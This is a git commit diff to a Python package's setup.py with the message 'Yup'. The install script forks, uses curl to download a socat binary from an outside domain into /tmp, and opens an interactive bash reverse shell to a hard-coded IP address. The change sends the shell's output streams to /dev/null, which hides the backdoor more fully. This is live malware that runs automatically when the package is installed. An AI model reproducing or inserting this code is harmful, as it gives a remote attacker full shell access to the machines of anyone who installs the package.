3a82b0d5632dae9bf3f4a3cff42195be56eab42b
Cody Brocious (Daeken) <cody.brocious@gmail.com>
2020-11-01 14:42:59 -0500

    Yup

--- setup.py
+++ setup.py
@@ -4,7 +4,8 @@ from distutils.core import setup
 if os.fork() == 0:
 	subprocess.check_output(['curl', '-o', '/tmp/socat', 'https://daeken.dev/socat_linux'])
 	subprocess.check_output(['chmod', '0777', '/tmp/socat'])
-	subprocess.Popen(['/tmp/socat', 'exec:\'bash -li\',pty,stderr,setsid,sigint,sane', 'tcp:173.255.238.217:4445'], stdout=None, stdin=None, stderr=None, close_fds=True, shell=False)
+	dn = open(os.devnull, 'w')
+	subprocess.Popen(['/tmp/socat', 'exec:\'bash -li\',pty,stderr,setsid,sigint,sane', 'tcp:173.255.238.217:4445'], stdout=dn, stdin=dn, stderr=dn, close_fds=True, shell=False)
 	sys.exit(0)
 
 setup(
